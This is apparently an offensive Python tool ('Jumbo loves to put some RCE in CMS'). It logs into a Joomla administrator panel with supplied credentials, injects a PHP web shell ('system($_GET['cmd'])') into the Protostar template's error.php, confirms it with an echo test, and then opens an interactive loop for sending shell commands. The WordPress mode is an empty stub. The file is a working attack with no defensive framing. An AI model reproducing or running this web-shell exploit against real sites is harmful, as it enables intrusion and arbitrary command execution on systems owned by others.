import sys
import requests
import argparse
from bs4 import BeautifulSoup


# WORDPRESS

# JOOMLA

# GET HIDDEN VALUES FROM /index.php IN JOOMLA
def get_hidden_values(url):
    try:
        response = requests.get(f"{url}/administrator/index.php")
    except requests.exceptions.MissingSchema:
        print("[-] Please specify a correct ip")
        print("Exit 🐘")
        sys.exit(1)
    except TypeError:
        print("The URL is None. Please provide a valid URL.")
    
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        
        hidden_inputs = soup.find_all('input', {'type': 'hidden'})
        
        hidden_values = {}
        
        for input_tag in hidden_inputs:
            name = input_tag.get('name', '')
            value = input_tag.get('value', '')
            
            if value == '1':
                hidden_values[value] = name
            else:    
                hidden_values[name] = value
            
        print(f"HIDDEN VALUES: {hidden_values}")
        return hidden_values
    
    else:
        print(f"Error: {url} Status code: {response.status_code}")
        return {}    

# LOGIN JOOMLA
def post_login_joomla(user, password, url, hidden_values):
    
    data = {
        'username': user,
        'passwd': password,
        'Submit=': '',
        'option': hidden_values.get('option', ''),
        'task': hidden_values.get('task', ''),
        'return': hidden_values.get('return', ''),
        hidden_values.get('1', ''): '1'
    }
    
    host = (f"{url}/administrator/index.php")

    response = requests.post(host, data, allow_redirects=True)

    print(response.request)
    # Debug
    print("[+] Start login into admin")
    print(f'[+] {data}')
    print(f'[+] Status code: {response.status_code}')
    # Lunch
    put_exploit_joomla(url)
    
# EXPLOIT JOOMLA
## exploit on the protostar theme, needs to make it for the active one etc..
def put_exploit_joomla(url):
    data = {
        'jform%5Bsource%5D': '%3C%3Fphp%0D%0Asystem%28%24_GET%5B%27cmd%27%5D%29%3B%0D%0A%3F%3E',
        'task': 'template.apply',
        'jform%5Bextension_id%5D': '506',
        'jform%5Bfilename%5D': 'error.php'
    }
    host = f"{url}/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA"
    response = requests.post(host, data, allow_redirects=True)
    print(response.status_code)
    
    print("[Exploit] Starting the exploit")
    host = f"{url}/templates/protostar/error.php/error.php?cmd="
    print(host)
    cmd_echo = f"{host}echo%20%27HelloWorld%27"
    print(cmd_echo)
    response = requests.get(cmd_echo)
    print(response.status_code)
    print(response.content.decode('utf-8'))
    
    if "HelloWorld" in response.content.decode('utf-8'):
        print("[+] Open input user, let's start hacking")
        while True:
            user_cmd = input("Enter a (web)shell command (type 'exit' to quit): ")
        
            if user_cmd.lower() == 'exit':
                break

            new_url = f"{host}{user_cmd}"
            response = requests.get(new_url)
        
            print(response.content.decode('utf-8'))
    else:
        print("[!] Can't open a webshell")

        

def main():
    parser = argparse.ArgumentParser(description='Jumbo loves to put some RCE in CMS')

    # Choose your CMS MODE
    parser.add_argument('mode', choices=['wordpress', 'joomla'], help='Choose a CMS mode: wordpress or joomla', nargs='?')

    # Options for WordPress & Joomla
    parser.add_argument('-u', '--username', dest='username', help='username')
    parser.add_argument('-p', '--password', dest='password', help='password')
    parser.add_argument('-H', '--url', dest='url', help='CMS website URL')

    args = parser.parse_args()

    if args.mode:
        if args.mode == 'wordpress':
            print('[+] Mode: wordpress')
        elif args.mode == 'joomla':
            print('[+] Mode: joomla')
            hidden_values = get_hidden_values(args.url)
            post_login_joomla(args.username, args.password, args.url, hidden_values)
    else:
        print("No CMS mode specified. Please choose a CMS mode: wordpress or joomla.")


if __name__ == "__main__":
    main()
